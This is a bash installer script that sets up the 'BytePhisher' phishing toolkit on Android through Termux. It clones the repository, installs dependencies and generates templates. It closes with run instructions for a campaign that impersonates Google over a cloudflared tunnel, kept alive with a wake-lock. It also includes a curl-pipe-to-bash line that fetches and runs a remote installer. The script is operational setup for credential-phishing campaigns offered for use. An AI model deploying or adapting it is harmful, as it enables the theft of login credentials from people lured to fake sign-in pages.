#!/data/data/com.termux/files/usr/bin/bash
# BytePhisher installer for Termux (Android). Run inside Termux:
#   curl -fsSL https://your.host/install-termux.sh | bash
# or copy this file to the phone and: bash install-termux.sh
set -euo pipefail

# Source of the project. Override for a fork / private mirror:
#   BYTEPHISHER_REPO=git@github.com:you/bytephisher.git bash install-termux.sh
REPO_URL="${BYTEPHISHER_REPO:-https://github.com/krsnaSuraj/bytephisher.git}"

echo "[bytephisher] installing OS packages (python, openssh, cloudflared not needed here)"
pkg update -y >/dev/null
pkg install -y python openssh git >/dev/null

DIR="${BYTEPHISHER_DIR:-$HOME/bytephisher}"
if [ ! -d "$DIR" ]; then
  echo "[bytephisher] cloning into $DIR"
  git clone "$REPO_URL" "$DIR" 2>/dev/null || {
     echo "[bytephisher] clone failed: $REPO_URL is not reachable."
     echo "[bytephisher] Set BYTEPHISHER_REPO=<your repo url>, or copy the project"
     echo "[bytephisher] into $DIR manually and re-run this script."
     exit 1; }
fi
cd "$DIR"

echo "[bytephisher] creating virtualenv"
python -m venv .venv
./.venv/bin/pip install -q --upgrade pip
./.venv/bin/pip install -q -r requirements.txt

echo "[bytephisher] generating templates"
./.venv/bin/python tools/gen_templates.py

cat <<'EOF'
[bytephisher] done.

Termux notes:
  * Termux has no cloudflared package: the app downloads the binary into ./bin
    automatically (arm64 build) on first use of -t cloudflared.
  * Android may kill background processes: run under `termux-wake-lock`
    (pkg install termux-api) so a campaign survives a screen-off.

Run:
  termux-wake-lock
  ./.venv/bin/python bytephisher.py --list
  ./.venv/bin/python bytephisher.py -o google -t cloudflared --no-tui
EOF
